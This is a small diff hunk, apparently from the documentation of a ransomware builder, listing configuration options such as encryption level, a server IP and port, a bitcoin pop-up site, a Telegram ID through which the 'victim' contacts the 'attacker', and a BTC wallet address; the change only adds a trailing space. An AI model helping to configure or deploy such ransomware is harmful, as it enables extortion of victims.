@@ -18,7 +18,7 @@ encryption_level = (default=128 // 8)\
 serverIp = ''\
 talkingPort = (default=5678)\
 sleepTimeForPopUpWebSite = (default=60 sec)\
-PopUpWebSite = (default='https://bitcoin.org/en/')\
+PopUpWebSite = (default='https://bitcoin.org/en/') \
 BackGroundUrl = (default= I declare a website in default)\
 TelegramID = ''✔ with this telegram id victim can comunicate with attacker\
 BTCWalletAddress = ''\
